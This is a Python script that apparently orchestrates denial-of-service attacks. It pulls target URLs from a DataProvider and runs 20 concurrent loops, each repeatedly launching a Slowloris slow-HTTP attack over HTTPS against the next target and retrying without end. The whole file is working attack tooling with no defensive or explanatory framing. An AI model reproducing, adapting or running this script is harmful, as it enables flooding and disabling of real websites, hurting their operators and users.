#!/usr/bin/env python3
import asyncio
from sys import stderr
from loguru import logger
from urllib3 import disable_warnings
from DataProvider import DataProvider

PARALLEL_COUNT = 20
LOG_ENABLE = False

dataProvider = DataProvider()

def main():
    loop = asyncio.get_event_loop()
    union = asyncio.gather(*[
        start_operation()
        for _ in range(PARALLEL_COUNT)
    ])
    loop.run_until_complete(union)

def printer(label):
    def pr(*args, **kw):
        print(label, *args, **kw)

    return pr

async def _read_stream(stream, cb):
    while True:
        line = await stream.readline()
        if line:
            cb(line)
        else:
            break

async def start_operation():
    while True:
        try:
            url = dataProvider.get_url()
            logger.info(f'URL {url}')
            process = await asyncio.create_subprocess_exec( "python3", 
            "slowloris.py", "--https", url, 
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            if LOG_ENABLE: 
                stdout_cb = printer(f"{url}_stdout")
                stderr_cb = printer(f"{url}_stderr")
                await asyncio.wait(
                    [
                        _read_stream(process.stdout, stdout_cb),
                        _read_stream(process.stderr, stderr_cb),
                    ]
                )
            stdout, stderr = await process.communicate()
        except Exception as e:
            logger.warning(f'Exception, retrying, exception={e}')
        except (KeyboardInterrupt, SystemExit):
            logger.info(f"Stopping {url}")
            break


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    disable_warnings()
    main()
